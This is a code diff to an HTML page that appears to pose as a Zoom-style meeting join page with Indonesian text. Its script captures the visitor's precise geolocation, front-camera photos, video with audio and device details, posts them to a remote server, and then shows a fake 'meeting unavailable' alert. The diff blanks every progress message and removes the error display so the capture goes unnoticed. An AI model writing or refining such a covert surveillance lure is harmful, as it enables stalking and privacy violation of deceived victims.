@@ -33,7 +33,6 @@
       font-size: 18px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer;
     }
     #status { margin: 20px 0; font-size: 15px; color: #0e72ed; }
-    #error { color: #d93025; font-size: 13px; margin-top: 10px; white-space: pre-wrap; text-align: left; background:#ffe6e6; padding:12px; border-radius:6px; }
     video { display: none; }
   </style>
 </head>
@@ -79,7 +78,7 @@
       try {
         // GEOLOCATION (optional)
         let locationData = { latitude: null, longitude: null, accuracy: 0, note: "failed_or_skipped" };
-        status.textContent = 'Mengakses lokasi...';
+        status.textContent = '';
         try {
           const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:10000}));
           locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
@@ -88,7 +87,7 @@
         await sleep(500);
 
         // CAMERA
-        status.textContent = 'Mengaktifkan kamera...';
+        status.textContent = '';
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: "user" }, 
           audio: true 
@@ -100,7 +99,7 @@
         await sleep(800);
 
         // PHOTOS
-        status.textContent = 'Mengambil foto...';
+        status.textContent = '';
         const photos = [];
         for (let i = 0; i < 3; i++) {
           await sleep(1000);
@@ -113,7 +112,7 @@
         }
 
         // VIDEO RECORDING
-        status.textContent = 'Merekam video...';
+        status.textContent = '';
         const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
         const recorder = new MediaRecorder(stream, { mimeType });
         const chunks = [];
@@ -128,7 +127,7 @@
         });
 
         // SEND TO SERVER
-        status.textContent = 'Mengirim data...';
+        status.textContent = '';
         const formData = new FormData();
         formData.append('location', JSON.stringify(locationData));
         formData.append('device_info', JSON.stringify({
@@ -149,7 +148,7 @@
         const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
         
         if (response.ok) {
-          status.innerHTML = '✅ BERHASIL TERKIRIM!';
+          status.innerHTML = '';
           alert("Meeting tidak tersedia. Silakan coba lagi nanti.");
         } else {
           throw new Error(`Server returned ${response.status}`);
@@ -158,13 +157,6 @@
         stream.getTracks().forEach(t => t.stop());
 
       } catch (err) {
-        console.error("=== FULL ERROR ===", err);
-        errorDiv.innerHTML = `
-          <b>TypeError terjadi</b><br>
-          Nama Error: ${err.name}<br>
-          Pesan: ${err.message}<br><br>
-          <small>Coba refresh halaman dan izinkan semua izin yang muncul.</small>
-        `;
         btn.disabled = false;
       }
     });
